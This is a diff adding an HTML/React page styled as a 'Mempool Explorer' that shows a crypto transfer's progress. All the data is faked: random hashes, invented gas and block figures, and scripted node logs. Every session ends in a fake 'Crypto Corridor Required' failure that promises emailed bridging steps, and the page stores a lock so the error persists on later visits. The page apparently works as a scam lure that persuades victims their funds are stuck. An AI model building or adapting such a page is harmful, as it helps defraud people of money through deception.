@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mempool Explorer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/react@18.2.0/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18.2.0/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <style>
+        * {
+            font-family: system-ui, -apple-system, 'Inter', sans-serif;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideInUpSmooth {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes slideOutDownSmooth {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+        }
+        
+        @keyframes errorGlow {
+            0% { border-color: rgba(239, 68, 68, 0.3); box-shadow: 0 0 0px rgba(239, 68, 68, 0); }
+            50% { border-color: rgba(239, 68, 68, 0.6); box-shadow: 0 0 15px rgba(239, 68, 68, 0.3); }
+            100% { border-color: rgba(239, 68, 68, 0.3); box-shadow: 0 0 0px rgba(239, 68, 68, 0); }
+        }
+        
+        .dialog-overlay {
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        .dialog-content {
+            animation: slideInUpSmooth 0.35s ease-out;
+        }
+        
+        .dialog-content-closing {
+            animation: slideOutDownSmooth 0.25s ease-in forwards;
+        }
+        
+        .error-shimmer {
+            animation: shimmer 2s ease-in-out infinite;
+        }
+        
+        .error-card {
+            animation: errorGlow 2s ease-in-out infinite;
+        }
+        
+        .support-button {
+            transition: all 0.2s ease;
+        }
+        
+        .support-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 20px -5px rgba(152, 87, 255, 0.3);
+        }
+        
+        .progress-bar {
+            transition: width 0.08s linear;
+        }
+
+        .step-item {
+            transition: all 0.2s ease;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b1220;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #9857ff;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body class="bg-[#0f172a]">
+    <div id="root"></div>
+
+    <script type="text/babel" data-presets="react">
+        // ========== PERSISTENT STORAGE (prevents replay until cache cleared) ==========
+        const PROGRESS_STORAGE_KEY = 'mempool_corridor_persistent_v4';
+        const VIEWER_LOCK_KEY = 'mempool_viewer_animation_locked_fixed';
+        const REFERENCE_NUMBER = '#489072';
+        
+        // Step definitions (internal percentages, not displayed as numbers)
+        const STEP_DEFINITIONS = [
+            { min: 0, max: 25, title: "Initialization & Processing", description: "Connecting to mempool nodes, verifying gas price, preparing transaction context." },
+            { min: 25, max: 50, title: "Bridging Check", description: "Validating cross-chain requirements, checking corridor availability & liquidity." },
+            { min: 50, max: 75, title: "Deploying transaction in Blockchain", description: "Broadcasting signed transaction to layer-1, awaiting initial confirmations." },
+            { min: 75, max: 100, title: "Finalizing the transaction", description: "Waiting for final settlement, accumulating block confirmations." }
+        ];
+        
+        const getStepByProgress = (progress) => {
+            if (progress >= 100) return { step: 4, title: "⚠️ Crypto Corridor Required", description: "Corridor handshake missing. Cross-chain bridge validation needed for wallet delivery." };
+            for (let i = 0; i < STEP_DEFINITIONS.length; i++) {
+                const step = STEP_DEFINITIONS[i];
+                if (progress >= step.min && progress < step.max) {
+                    return { step: i, title: step.title, description: step.description };
+                }
+            }
+            return { step: 0, title: STEP_DEFINITIONS[0].title, description: STEP_DEFINITIONS[0].description };
+        };
+        
+        // Helper components
+        const Dialog = ({ open, onOpenChange, children, isClosing }) => {
+            if (!open && !isClosing) return null;
+            return React.createElement('div', {
+                className: "fixed inset-0 z-50 flex items-center justify-center"
+            }, [
+                React.createElement('div', {
+                    key: 'overlay',
+                    className: "fixed inset-0 bg-black/70 dialog-overlay",
+                    onClick: () => onOpenChange(false)
+                }),
+                React.createElement('div', {
+                    key: 'content',
+                    className: "relative z-50 w-full max-w-md mx-4"
+                }, children)
+            ]);
+        };
+        
+        const Dashboard = () => {
+            // ----- PERSISTENCE LOGIC: prevent replay & save full state -----
+            const getPersistedState = () => {
+                try {
+                    const locked = localStorage.getItem(VIEWER_LOCK_KEY);
+                    if (locked === 'true') {
+                        return { isLocked: true, data: null };
+                    }
+                    const savedRaw = localStorage.getItem(PROGRESS_STORAGE_KEY);
+                    if (savedRaw) {
+                        const data = JSON.parse(savedRaw);
+                        if (data.terminalReached === true) {
+                            localStorage.setItem(VIEWER_LOCK_KEY, 'true');
+                            return { isLocked: true, data: null };
+                        }
+                        return { isLocked: false, data };
+                    }
+                } catch (e) { console.warn("Storage read error", e); }
+                return { isLocked: false, data: null };
+            };
+            
+            const persisted = getPersistedState();
+            const isGloballyLocked = persisted.isLocked;
+            const savedData = persisted.data;
+            
+            // State initialization
+            const [progress, setProgress] = React.useState(() => {
+                if (isGloballyLocked) return 100;
+                return savedData?.progress ?? 0;
+            });
+            const [confirmations, setConfirmations] = React.useState(() => savedData?.confirmations ?? 0);
+            const [gas, setGas] = React.useState(() => savedData?.gas ?? 0.0038);
+            const [blockHeight, setBlockHeight] = React.useState(() => savedData?.blockHeight ?? 840000);
+            const [mempoolSize, setMempoolSize] = React.useState(() => savedData?.mempoolSize ?? 124);
+            const [txs, setTxs] = React.useState(() => savedData?.txs ?? []);
+            const [logs, setLogs] = React.useState(() => {
+                if (savedData?.logs && savedData.logs.length > 0) return savedData.logs;
+                // Initial welcome log
+                return ["🟢 Node connection established", "📡 Syncing mempool state..."];
+            });
+            const [openFinalDialog, setOpenFinalDialog] = React.useState(false);
+            const [openSupportDialog, setOpenSupportDialog] = React.useState(false);
+            const [status, setStatus] = React.useState("Processing");
+            const [errorFlag, setErrorFlag] = React.useState(() => isGloballyLocked || savedData?.terminalReached === true);
+            const [isClosingFinal, setIsClosingFinal] = React.useState(false);
+            const [isClosingSupport, setIsClosingSupport] = React.useState(false);
+            
+            const intervalsRef = React.useRef([]);
+            const animationFrameRef = React.useRef(null);
+            const completedRef = React.useRef(isGloballyLocked || savedData?.terminalReached === true);
+            const saveTimeoutRef = React.useRef(null);
+            
+            const randomHash = () => "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
+            
+            // Save full state
+            const saveFullState = (isTerminal = false) => {
+                if (completedRef.current && !isTerminal) return;
+                try {
+                    const state = {
+                        progress: progress,
+                        confirmations: confirmations,
+                        gas: gas,
+                        blockHeight: blockHeight,
+                        mempoolSize: mempoolSize,
+                        txs: txs.slice(0, 12),
+                        logs: logs.slice(0, 20),
+                        terminalReached: isTerminal || completedRef.current,
+                        timestamp: Date.now()
+                    };
+                    localStorage.setItem(PROGRESS_STORAGE_KEY, JSON.stringify(state));
+                    if (isTerminal || completedRef.current) {
+                        localStorage.setItem(VIEWER_LOCK_KEY, 'true');
+                    }
+                } catch (e) { console.log("Save failed", e); }
+            };
+            
+            // Auto-save on state changes
+            React.useEffect(() => {
+                if (completedRef.current) return;
+                if (saveTimeoutRef.current) clearTimeout(saveTimeoutRef.current);
+                saveTimeoutRef.current = setTimeout(() => {
+                    if (!completedRef.current && progress < 99.5) {
+                        saveFullState(false);
+                    }
+                }, 500);
+                return () => { if (saveTimeoutRef.current) clearTimeout(saveTimeoutRef.current); };
+            }, [progress, confirmations, gas, blockHeight, mempoolSize, txs, logs]);
+            
+            const clearAllIntervals = () => {
+                intervalsRef.current.forEach(interval => clearInterval(interval));
+                intervalsRef.current = [];
+                if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);
+            };
+            
+            // Function to add logs with timestamp
+            const addLog = (message, isError = false) => {
+                setLogs(prev => {
+                    const newLog = (isError ? "⚠️ " : "📌 ") + message;
+                    return [newLog, ...prev.slice(0, 14)];
+                });
+            };
+            
+            // Show final corridor dialog
+            const showFinalCorridorDialog = () => {
+                if (completedRef.current) return;
+                completedRef.current = true;
+                setErrorFlag(true);
+                setStatus("Corridor Required");
+                clearAllIntervals();
+                
+                addLog("❌ CRITICAL: Corridor handshake failure at final settlement", true);
+                addLog("⚠️ Crypto corridor required — transaction cannot land in wallet", true);
+                addLog("📧 Support notified — you will receive email with bridging steps", true);
+                
+                saveFullState(true);
+                setOpenFinalDialog(true);
+            };
+            
+            // ========== 25-second variable-speed animation with continuous log updates ==========
+            React.useEffect(() => {
+                if (completedRef.current || isGloballyLocked) return;
+                if (progress >= 99.5) {
+                    if (!completedRef.current) showFinalCorridorDialog();
+                    return;
+                }
+                
+                const TOTAL_DURATION_MS = 25000;
+                let startProgress = progress;
+                let startTimestamp = performance.now();
+                let finalTriggered = false;
+                let lastProgressValue = progress;
+                let lastLogSecond = -1;
+                
+                const animateVariableSpeed = (now) => {
+                    if (completedRef.current) return;
+                    const elapsed = now - startTimestamp;
+                    let targetRaw = startProgress + (elapsed / TOTAL_DURATION_MS) * (100 - startProgress);
+                    let newProgress = Math.min(targetRaw, 100);
+                    
+                    // Add organic random walk
+                    if (newProgress < 99.2 && newProgress > 2) {
+                        let jitter = (Math.random() - 0.5) * 1.4;
+                        let adjusted = newProgress + jitter;
+                        adjusted = Math.min(Math.max(adjusted, lastProgressValue + 0.05), lastProgressValue + 2.0);
+                        adjusted = Math.min(adjusted, 99.8);
+                        newProgress = Math.max(newProgress - 0.2, adjusted);
+                        newProgress = Math.min(99.9, Math.max(0, newProgress));
+                    }
+                    newProgress = Math.min(100, Math.max(0, newProgress));
+                    setProgress(newProgress);
+                    lastProgressValue = newProgress;
+                    
+                    // Generate logs based on progress milestones (every 5-10%)
+                    const currentSecond = Math.floor(elapsed / 1000);
+                    if (currentSecond !== lastLogSecond && !completedRef.current) {
+                        lastLogSecond = currentSecond;
+                        
+                        // Rich logging based on progress percentage
+                        if (newProgress < 25) {
+                            const msgs = [
+                                "Scanning mempool for pending transactions",
+                                `Connected to 3 Ethereum nodes · latency 42ms`,
+                                `Current base fee: ${(gas * 1.2).toFixed(5)} ETH`,
+                                `Mempool size: ${mempoolSize} unconfirmed txs`,
+                                "Verifying transaction eligibility"
+                            ];
+                            if (Math.random() > 0.6) addLog(msgs[Math.floor(Math.random() * msgs.length)]);
+                        } else if (newProgress >= 25 && newProgress < 50) {
+                            const msgs = [
+                                `🔁 Cross-chain corridor bridge check in progress`,
+                                `Validating corridor reference ${REFERENCE_NUMBER}`,
+                                `Bridge liquidity: sufficient for ${(Math.random() * 5 + 1).toFixed(2)} ETH`,
+                                "Corridor handshake initiated with sidechain",
+                                "Awaiting bridge validator confirmations"
+                            ];
+                            addLog(msgs[Math.floor(Math.random() * msgs.length)]);
+                        } else if (newProgress >= 50 && newProgress < 75) {
+                            const msgs = [
+                                `⛓️ Broadcasting transaction to blockchain`,
+                                `Contract deployment at block ${blockHeight + 1}`,
+                                `Gas used: ${Math.floor(Math.random() * 50000 + 21000)} units`,
+                                `Transaction hash: ${randomHash()}`,
+                                "Waiting for 3 confirmations"
+                            ];
+                            addLog(msgs[Math.floor(Math.random() * msgs.length)]);
+                        } else if (newProgress >= 75 && newProgress < 100) {
+                            const msgs = [
+                                `✅ Finalizing transaction · ${Math.floor(confirmations)}/12 confirmations`,
+                                `Block ${blockHeight} finality threshold: 87%`,
+                                "Settlement layer finalizing state root",
+                                "Cross-chain proof generation in progress",
+                                `Average block time: ${(Math.random() * 2 + 10).toFixed(1)}s`
+                            ];
+                            addLog(msgs[Math.floor(Math.random() * msgs.length)]);
+                        }
+                    }
+                    
+                    if (newProgress >= 99.8 && !finalTriggered && !completedRef.current) {
+                        finalTriggered = true;
+                        setProgress(100);
+                        addLog("⚠️ Transaction reached 100% — initiating final corridor check", true);
+                        setTimeout(() => {
+                            if (!completedRef.current) showFinalCorridorDialog();
+                        }, 300);
+                        if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);
+                        return;
+                    }
+                    
+                    if (newProgress < 100 && !completedRef.current) {
+                        animationFrameRef.current = requestAnimationFrame(animateVariableSpeed);
+                    } else if (newProgress >= 100 && !finalTriggered && !completedRef.current) {
+                        finalTriggered = true;
+                        setTimeout(() => showFinalCorridorDialog(), 200);
+                    }
+                };
+                
+                animationFrameRef.current = requestAnimationFrame(animateVariableSpeed);
+                
+                // Background live data simulation (mempool, txs, confirmations, gas)
+                const dataInterval = setInterval(() => {
+                    if (completedRef.current) return;
+                    
+                    setConfirmations(prev => {
+                        let increase = 0;
+                        if (progress < 28) increase = 0.4;
+                        else if (progress < 68) increase = 0.8;
+                        else if (progress < 96) increase = 1.0;
+                        else increase = 0.2;
+                        return Math.min(prev + increase, 16);
+                    });
+                    
+                    setGas(g => {
+                        let variation = (Math.random() - 0.5) * 0.0006;
+                        let newGas = g + variation;
+                        if (progress > 80 && !completedRef.current) newGas += 0.0003;
+                        return Math.max(0.0022, Math.min(0.0085, newGas));
+                    });
+                    
+                    setBlockHeight(h => h + (Math.random() > 0.55 ? 1 : 0));
+                    setMempoolSize(s => Math.max(45, Math.min(280, s + Math.floor((Math.random() - 0.5) * 15))));
+                    
+                    setTxs(prev => {
+                        const newTx = { 
+                            hash: randomHash(), 
+                            fee: (Math.random() * 0.008 + 0.001).toFixed(5), 
+                            time: new Date().toLocaleTimeString() 
+                        };
+                        return [newTx, ...prev.slice(0, 5)];
+                    });
+                    
+                    // Additional random logs for node activity (ensure logs keep flowing)
+                    if (!completedRef.current && Math.random() > 0.65) {
+                        const nodeMessages = [
+                            `Node sync status: ${Math.floor(progress)}% · block ${blockHeight}`,
+                            `P2P peers: ${Math.floor(Math.random() * 20 + 8)} active connections`,
+                            `Transaction pool depth: ${mempoolSize} pending`,
+                            `Propagating block ${blockHeight + Math.floor(Math.random() * 3)} to peers`,
+                            `Mempool min fee: ${(Math.random() * 0.002 + 0.001).toFixed(5)} ETH`
+                        ];
+                        if (progress < 98) addLog(nodeMessages[Math.floor(Math.random() * nodeMessages.length)]);
+                    }
+                }, 1400);
+                
+                intervalsRef.current.push(dataInterval);
+                
+                return () => {
+                    if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);
+                    clearInterval(dataInterval);
+                };
+            }, [isGloballyLocked]);
+            
+            // If locked from previous completion, show final state
+            React.useEffect(() => {
+                if (isGloballyLocked && !completedRef.current) {
+                    completedRef.current = true;
+                    setErrorFlag(true);
+                    setStatus("Corridor Required");
+                    setProgress(100);
+                    setLogs(prev => [
+                        "❌ Previous session: corridor handshake unresolved",
+                        "⚠️ Crypto corridor still required — transaction cannot land in wallet",
+                        "📧 Support has been notified. Check your email for bridging steps.",
+                        ...prev.slice(0, 3)
+                    ]);
+                    setTimeout(() => {
+                        setOpenSupportDialog(true);
+                    }, 500);
+                }
+            }, [isGloballyLocked]);
+            
+            // Update status label
+            React.useEffect(() => {
+                if (completedRef.current || errorFlag) { setStatus("Corridor Required"); return; }
+                if (progress >= 100) setStatus("Awaiting Corridor");
+                else if (progress >= 75) setStatus("Finalizing");
+                else if (progress >= 50) setStatus("Deploying");
+                else if (progress >= 25) setStatus("Bridging");
+                else setStatus("Processing");
+            }, [progress, errorFlag]);
+            
+            const currentStepMeta = getStepByProgress(progress);
+            const isAtHundred = progress >= 100 || completedRef.current;
+            
+            // Dialog handlers
+            const handleCloseFinal = () => {
+                setIsClosingFinal(true);
+                setTimeout(() => {
+                    setOpenFinalDialog(false);
+                    setIsClosingFinal(false);
+                    setTimeout(() => setOpenSupportDialog(true), 180);
+                }, 250);
+            };
+            
+            const handleCloseSupport = () => {
+                setIsClosingSupport(true);
+                setTimeout(() => {
+                    setOpenSupportDialog(false);
+                    setIsClosingSupport(false);
+                }, 250);
+            };
+            
+            // UI Components
+            const Card = ({ children, error: hasError, className = "" }) => (
+                React.createElement('div', { className: `bg-[#111827]/80 backdrop-blur-xl border ${hasError ? 'border-red-500/50 error-card' : 'border-[#1f2937]'} shadow-xl rounded-2xl transition-all duration-300 ${className}` }, children)
+            );
+            const CardContent = ({ children, className = "" }) => React.createElement('div', { className: `p-6 ${className}` }, children);
+            const Badge = ({ children, className = "" }) => React.createElement('span', { className: `px-2 py-1 text-xs font-medium rounded-full transition-all duration-300 ${className}` }, children);
+            const ProgressBar = ({ value, errorMode, className = "" }) => React.createElement('div', { className: `w-full bg-[#0b1220] rounded-full h-3 overflow-hidden ${className}` },
+                React.createElement('div', { className: "progress-bar h-full rounded-full", style: { width: `${value}%`, background: errorMode ? 'linear-gradient(90deg, #f97316, #dc2626)' : 'linear-gradient(90deg, #9857ff, #60a5fa)' } })
+            );
+            const Button = ({ children, onClick, variant = 'primary', className = "" }) => React.createElement('button', { onClick, className: `px-4 py-2 rounded-lg font-medium transition-all duration-200 support-button ${variant === 'primary' ? 'bg-gradient-to-r from-[#9857ff] to-[#7c3aed] text-white' : 'bg-[#1f2937] text-white/80 hover:bg-[#374151]'} ${className}` }, children);
+            
+            const WarningCorridorIcon = () => React.createElement('div', { className: "mx-auto w-16 h-16 mb-4 rounded-full bg-orange-500/20 flex items-center justify-center border-2 border-orange-500/60" },
+                React.createElement('svg', { className: "w-8 h-8 text-orange-400", fill: "none", stroke: "currentColor", viewBox: "0 0 24 24" },
+                    React.createElement('path', { strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: 2, d: "M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" })
+                )
+            );
+            
+            const SupportMailIcon = () => React.createElement('div', { className: "mx-auto w-16 h-16 mb-4 rounded-full bg-[#9857ff]/20 flex items-center justify-center" },
+                React.createElement('svg', { className: "w-8 h-8 text-[#9857ff]", fill: "none", stroke: "currentColor", viewBox: "0 0 24 24" },
+                    React.createElement('path', { strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: 2, d: "M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" })
+                )
+            );
+            
+            const DialogContent = ({ children, isClosing }) => React.createElement('div', { className: `bg-gradient-to-br from-[#1a1f2e] to-[#0f1420] backdrop-blur-xl border border-[#2a2f3e] rounded-2xl p-6 shadow-2xl ${isClosing ? 'dialog-content-closing' : 'dialog-content'}` }, children);
+            
+            // Step timeline component
+            const StepTimeline = () => {
+                const baseSteps = [
+                    { rangeLabel: "Init", title: "Initialization", key: 0 },
+                    { rangeLabel: "Bridge", title: "Bridging Check", key: 1 },
+                    { rangeLabel: "Deploy", title: "Deploying", key: 2 },
+                    { rangeLabel: "Final", title: "Finalizing", key: 3 }
+                ];
+                const showCorridor = (progress >= 100 || completedRef.current);
+                const allSteps = showCorridor ? [...baseSteps, { rangeLabel: "100%", title: "Corridor", key: 4, errorStyle: true }] : baseSteps;
+                
+                let activeIndex = -1;
+                if (progress >= 100 || completedRef.current) activeIndex = showCorridor ? 4 : 3;
+                else if (progress >= 75) activeIndex = 3;
+                else if (progress >= 50) activeIndex = 2;
+                else if (progress >= 25) activeIndex = 1;
+                else if (progress > 0) activeIndex = 0;
+                
+                return React.createElement('div', { className: "mt-5 grid gap-2 text-xs", style: { gridTemplateColumns: `repeat(${allSteps.length}, minmax(0, 1fr))` } }, 
+                    allSteps.map(step => {
+                        const isActive = activeIndex === step.key;
+                        const isCompleted = (step.key === 0 && progress > 0) || (step.key === 1 && progress >= 25) || (step.key === 2 && progress >= 50) || (step.key === 3 && progress >= 75) || (step.key === 4 && (progress >= 100 || completedRef.current));
+                        let statusClass = "border-gray-700 text-white/50";
+                        if (step.errorStyle && (isActive || isCompleted)) {
+                            statusClass = "border-red-500 bg-red-500/20 text-orange-300 shadow-md animate-pulse";
+                        } else if (isActive && !completedRef.current && progress < 100) {
+                            statusClass = "border-[#9857ff] bg-[#9857ff]/20 text-[#9857ff] shadow-sm";
+                        } else if (isCompleted && !step.errorStyle) {
+                            statusClass = "border-green-500/60 text-green-400 bg-green-500/10";
+                        } else if (step.errorStyle && progress >= 100) {
+                            statusClass = "border-orange-500 bg-orange-500/20 text-orange-400 font-bold";
+                        }
+                        return React.createElement('div', { key: step.key, className: `text-center p-2 rounded-lg border ${statusClass} transition-all step-item` }, [
+                            React.createElement('div', { key: 'label', className: "font-mono opacity-80 text-[10px] md:text-xs" }, step.rangeLabel),
+                            React.createElement('div', { key: 'title', className: "font-semibold mt-1 leading-tight text-[11px] md:text-xs" }, step.title)
+                        ]);
+                    })
+                );
+            };
+            
+            return React.createElement('div', { className: "min-h-screen text-white p-6 flex justify-center relative overflow-hidden" }, [
+                React.createElement('div', { key: 'bg', className: "absolute inset-0 bg-gradient-to-br from-[#9857ff20] via-transparent to-[#60a5fa10] blur-3xl" }),
+                React.createElement('div', { key: 'content', className: "w-full max-w-6xl space-y-6 relative z-10" }, [
+                    React.createElement(Card, { key: 'header', className: "rounded-2xl" },
+                        React.createElement(CardContent, { className: "p-6 text-center" }, [
+                            React.createElement('div', { className: "text-2xl font-semibold bg-gradient-to-r from-[#9857ff] to-[#60a5fa] bg-clip-text text-transparent" }, "Mempool Explorer - Bridged Transaction Status"),
+                        ])
+                    ),
+                    
+                    React.createElement('div', { key: 'stats', className: "grid grid-cols-3 gap-4" }, [
+                        { label: "Block Height", value: blockHeight },
+                        { label: "Mempool Size", value: mempoolSize + " txs" },
+                        { label: "Avg Fee", value: gas.toFixed(5) + " ETH" }
+                    ].map((item, i) => 
+                        React.createElement(Card, { key: i, className: "rounded-2xl" },
+                            React.createElement(CardContent, { className: "p-4" }, [
+                                React.createElement('div', { className: "text-xs text-white/70" }, item.label),
+                                React.createElement('div', { className: `text-lg font-semibold mt-1 ${(completedRef.current && item.label === "Avg Fee") ? 'text-amber-400' : ''}` }, item.value)
+                            ])
+                        )
+                    )),
+                    
+                    React.createElement(Card, { key: 'status', error: completedRef.current, className: "rounded-2xl" },
+                        React.createElement(CardContent, { className: "p-6 space-y-4" }, [
+                            React.createElement('div', { className: "flex justify-between items-center" }, [
+                                React.createElement('span', { className: "text-white/80 font-medium" }, "Transaction Status"),
+                                React.createElement(Badge, { className: completedRef.current ? 'bg-orange-600 animate-pulse' : status === 'Finalizing' ? 'bg-green-500' : status === 'Deploying' ? 'bg-blue-500' : status === 'Bridging' ? 'bg-purple-500' : 'bg-[#60a5fa]' }, 
+                                    completedRef.current ? "⚠️ Corridor failure" : status
+                                )
+                            ]),
+                            React.createElement(ProgressBar, { value: progress, errorMode: completedRef.current }),
+                            
+                            React.createElement('div', { className: "mt-2 bg-black/30 rounded-xl p-4 border border-white/5" }, [
+                                React.createElement('div', { className: "flex items-center gap-2 mb-2" }, [
+                                    React.createElement('div', { className: "w-2 h-2 rounded-full", style: { backgroundColor: completedRef.current ? '#f97316' : (progress >= 100 ? '#f97316' : '#9857ff') } }),
+                                    React.createElement('span', { className: "text-sm font-mono text-white/90" }, 
+                                        isAtHundred ? "❌ CRYPTO CORRIDOR REQUIRED — Action needed" : `STEP ${currentStepMeta.step + 1}/4 · ${currentStepMeta.title}`
+                                    )
+                                ]),
+                                React.createElement('p', { className: "text-sm text-white/70 leading-relaxed" }, 
+                                    isAtHundred ? 
+                                        "Transaction reached 100% finalization but cannot land in your wallet: crypto corridor handshake is missing / incomplete. Funds are secured; cross-chain bridge validation required." 
+                                        : currentStepMeta.description
+                                ),
+                                React.createElement('div', { className: "mt-3 text-xs text-right text-white/40" }, `~${Math.floor(progress)}%`)
+                            ]),
+                            React.createElement(StepTimeline, { key: 'error-timeline' })
+                        ])
+                    ),
+                    
+                    React.createElement(Card, { key: 'txs', className: "rounded-2xl" },
+                        React.createElement(CardContent, { className: "p-6" }, [
+                            React.createElement('div', { className: "text-sm text-white/70 mb-4" }, "Recent Mempool Activity"),
+                            React.createElement('div', { className: "space-y-2 max-h-64 overflow-y-auto" },
+                                txs.length === 0 ? React.createElement('div', { className: "text-center text-white/50 py-4" }, "Awaiting broadcast...") :
+                                txs.map((tx, i) => React.createElement('div', { key: i, className: `flex justify-between text-xs bg-[#0b1220]/70 p-3 rounded-xl border border-[#1f2937] transition-all ${completedRef.current ? 'opacity-60' : ''}` }, [
+                                    React.createElement('span', { className: "text-[#60a5fa] font-mono" }, tx.hash),
+                                    React.createElement('span', {}, `${tx.fee} ETH`),
+                                    React.createElement('span', { className: "text-white/60" }, tx.time)
+                                ]))
+                            )
+                        ])
+                    ),
+                    
+                    React.createElement(Card, { key: 'logs', className: "rounded-2xl" },
+                        React.createElement(CardContent, { className: "p-4" }, [
+                            React.createElement('div', { className: "text-sm text-white/70 mb-2" }, "Node Activity & Corridor Status"),
+                            React.createElement('div', { className: "text-xs space-y-1 text-white/70 max-h-40 overflow-y-auto font-mono" },
+                                logs.length === 0 ? React.createElement('div', {}, "Initializing node connection...") :
+                                logs.map((log, idx) => React.createElement('div', { key: idx, className: `${log.includes('❌') || log.includes('⚠️') ? 'text-orange-400' : ''} ${completedRef.current && log.includes('corridor') ? 'text-orange-300 font-medium' : ''} animate-fadeIn` }, "› ", log))
+                            )
+                        ])
+                    ),
+                    
+                    openFinalDialog && React.createElement(Dialog, { key: 'final-dialog', open: openFinalDialog, onOpenChange: handleCloseFinal, isClosing: isClosingFinal },
+                        React.createElement(DialogContent, { isClosing: isClosingFinal },
+                            React.createElement('div', { className: "text-center" }, [
+                                React.createElement(WarningCorridorIcon, { key: 'icon' }),
+                                React.createElement('h2', { className: "text-orange-500 text-2xl mb-2 font-bold" }, "⚠️ Crypto Corridor Required"),
+                                React.createElement('div', { className: "text-sm text-white/80 mb-6 space-y-2" }, [
+                                    React.createElement('p', { className: "text-red-300 font-semibold" }, "❌ Finalization error — corridor handshake missing"),
+                                    React.createElement('p', { className: "font-medium text-orange-300" }, "Cross-chain corridor handshake is incomplete / rejected."),
+                                    React.createElement('p', { className: "text-xs bg-black/40 p-2 rounded-lg font-mono border border-red-500/30" }, `Corridor reference: ${REFERENCE_NUMBER}`),
+                                    React.createElement('p', { className: "text-white/80" }, "Our support team will contact you via email with bridging instructions to finalize settlement.")
+                                ]),
+                                React.createElement(Button, { onClick: handleCloseFinal, variant: "primary", className: "w-full bg-gradient-to-r from-orange-600 to-red-600 hover:from-orange-500 hover:to-red-500" }, "Contact Support →")
+                            ])
+                        )
+                    ),
+                    
+                    openSupportDialog && React.createElement(Dialog, { key: 'support-final', open: openSupportDialog, onOpenChange: handleCloseSupport, isClosing: isClosingSupport },
+                        React.createElement(DialogContent, { isClosing: isClosingSupport },
+                            React.createElement('div', { className: "text-center" }, [
+                                React.createElement(SupportMailIcon, { key: 'icon' }),
+                                React.createElement('h2', { className: "text-[#60a5fa] text-2xl mb-2 font-semibold" }, "Support Ticket Created"),
+                                React.createElement('div', { className: "text-sm text-white/80 mb-6" }, [
+                                    React.createElement('p', {}, "Our support engineers have been notified about the corridor issue."),
+                                    React.createElement('p', { className: "mt-3 font-mono bg-black/30 p-2 rounded" }, `Reference: ${REFERENCE_NUMBER}`),
+                                    React.createElement('p', { className: "mt-3 text-white/90" }, "✉️ You will receive an email within 5 minutes with corridor activation steps and wallet delivery instructions."),
+                                    React.createElement('p', { className: "mt-2 text-xs text-white/50" }, "No funds have been lost — finalization requires corridor bridging.")
+                                ]),
+                                React.createElement(Button, { onClick: handleCloseSupport, variant: "primary", className: "w-full" }, "Understood")
+                            ])
+                        )
+                    )
+                ])
+            ]);
+        };
+        
+        ReactDOM.createRoot(document.getElementById('root')).render(React.createElement(Dashboard));
+    </script>
+</body>
+</html>
